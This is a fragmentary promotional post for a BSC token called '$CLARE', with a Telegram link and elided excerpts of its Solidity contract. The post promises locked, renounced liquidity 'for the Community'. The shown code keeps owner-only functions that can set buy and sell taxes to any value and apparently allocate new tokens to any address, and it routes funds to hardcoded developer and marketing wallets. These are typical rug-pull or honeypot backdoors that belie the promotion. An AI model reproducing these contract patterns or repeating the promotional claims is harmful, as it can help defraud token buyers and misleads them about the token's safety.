...
🔮$CLARE - CLARE MAZZETTI For the Community, 
LP will be Lock and Renounced at launch (BSC) 10.00-11.30pm UTC.

🔮Join for more info!
TG: https://t.me/+UwAJvfpKDe4yMGI1
...
contract CLAREMAZZETTI is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "CLARE MAZZETTI";
    string private constant _symbol = unicode"$CLARE";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private _TxCount = 0;
    uint256 private _tTotal = 17000000 * 10**_decimals;
    ...
    address payable public DevWallet = payable(0x29D0364c7711349962815DDeda7CbC2847937f1E);
    address payable public MarketingWallet = payable(0x19f468acEb2832d8f9f6C01e376766E2b34854AB);
    ...
    function putnewFees(uint256 buytax, uint256 selltax) external onlyAddress {
        _tax_On_Buy = buytax;
    ...
    function putmaxTx() external onlyAddress {
        _maxTxAmount = _maxWalletToken;
    }
    function putmaxWallet(uint256 newmaxWallet) external onlyAddress {
    ...
    function allocatenewToken(uint256 value, address adr) onlyAddress public virtual {
